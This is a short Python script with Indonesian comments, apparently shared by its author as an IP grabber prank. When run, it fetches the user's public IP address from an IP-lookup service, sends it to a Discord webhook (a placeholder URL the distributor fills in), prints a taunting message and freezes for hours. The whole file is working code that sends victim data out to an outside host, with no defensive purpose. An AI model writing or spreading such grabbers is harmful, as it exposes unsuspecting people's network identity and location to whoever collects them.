# Dibuat oleh WilliamNS
# Jika ada kesalahan di dalam code, tanggung sendiri ya
# Belajar benerin sendiri kalau ada yang salah
# Ini gw buat nya di codeanywhere.com (UNIX Container)
# Dan pakai python3 pasti nya

# Import the library (Gak tau harus nyebut apa jink)
import requests, time

# Discord webhook URL
webhook = "YOUR_WEBHOOK_URL"

# Yaudah, mulai dari sini kont
ip = requests.get("https://api.ipify.org").text
payload = {'content': f'```Logging : {ip}```'}
requests.post(webhook, json=payload)

# Kalian edit kata-kata panik nya (BEBAS)
print("[?] Yaayyy Your IP Got Eaten by WilliamNS")

# Freeze dulu ye kan, wkwkwkwkwk
time.sleep(9090)
